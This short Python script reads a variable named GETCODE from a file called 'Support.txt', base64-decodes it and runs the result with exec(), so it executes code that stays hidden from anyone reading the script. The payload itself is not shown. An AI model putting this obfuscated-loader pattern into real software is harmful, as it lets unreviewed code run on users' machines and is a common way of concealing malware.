import os
import base64

def load_variables(filename):
    variables = {}
    with open(filename, 'r') as file:
        for line in file:
            # Split the line into key and value
            key, value = line.strip().split('=')
            variables[key] = value
    return variables

# Load the variables
config = load_variables('Support.txt')

# Access the variable
GETCODE = config['GETCODE']

# Decode the Base64-encoded variable
decoded_bytes = base64.b64decode(GETCODE)
decoded_code = decoded_bytes.decode('utf-8')

# Execute the decoded code
exec(decoded_code)
